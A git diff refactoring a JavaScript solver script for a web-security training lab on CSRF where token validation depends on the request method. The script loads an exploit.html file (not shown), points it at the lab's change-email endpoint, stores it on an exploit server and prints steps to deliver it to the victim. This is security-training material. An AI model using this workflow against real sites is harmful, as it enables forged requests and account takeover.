@@ -1,8 +1,7 @@
 import { ExploitServer } from "../../../utils/exploitServer.js";
-import { getFileContent } from "../../../utils/getFileContent.js";
 import { getParsedInput } from "../../../utils/getParsedInput.js";
 import { runTasks } from "../../../utils/runTasks.js";
-import { replaceActionAttribute } from "../utils/replaceActionAttribute.js";
+import { createExploit } from "../utils/createExploit.js";
 
 const { url, httpClient } = getParsedInput({
   description: "Lab: CSRF where token validation depends on request method",
@@ -10,16 +9,19 @@ const { url, httpClient } = getParsedInput({
 });
 
 async function task() {
-  let exploit = await getFileContent("./exploit.html");
-  const changeEmailUrl = url + "my-account/change-email";
-  exploit = replaceActionAttribute(exploit, changeEmailUrl);
-
+  const exploit = await getExploit();
   const exploitServer = await ExploitServer.create(url, httpClient);
-  exploitServer.storeExploit(exploit);
+  await exploitServer.storeExploit(exploit);
 
   console.log(`To solve the lab:
   1. Visit ${exploitServer.url}
   2. Press "Deliver exploit to victim" button`);
+}
+
+async function getExploit() {
+  const exploitFilePath = new URL("./exploit.html", import.meta.url);
+  const actionUrl = url + "my-account/change-email";
+  return createExploit(exploitFilePath, { actionUrl });
 }
 
 runTasks([task]);
